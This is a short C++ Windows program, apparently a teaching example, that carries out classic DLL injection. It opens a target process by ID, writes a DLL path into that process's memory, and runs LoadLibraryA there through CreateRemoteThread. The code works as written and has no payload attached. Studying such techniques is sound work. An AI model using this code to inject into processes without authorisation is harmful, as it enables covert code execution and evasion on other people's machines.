// Dll injection.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include<Windows.h>

int main(int argc,char *argv[])
{
    PTHREAD_START_ROUTINE method_addr = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryA");

    int pid = atoi(argv[1]);
    char dll[] = "C:\\Users\\root\\Downloads\\tmp.dll";
    //
    HANDLE phandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    LPVOID address = VirtualAllocEx(phandle, NULL, sizeof dll, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(phandle, address, (LPCVOID)dll, sizeof dll, NULL);

    //We are using DLL path to execute dll injection so we need pointer to function LoadLibraryA and pass the address of the dll path
    CreateRemoteThread(phandle, NULL, 0, method_addr, address, NULL,0);
    CloseHandle(phandle);
}
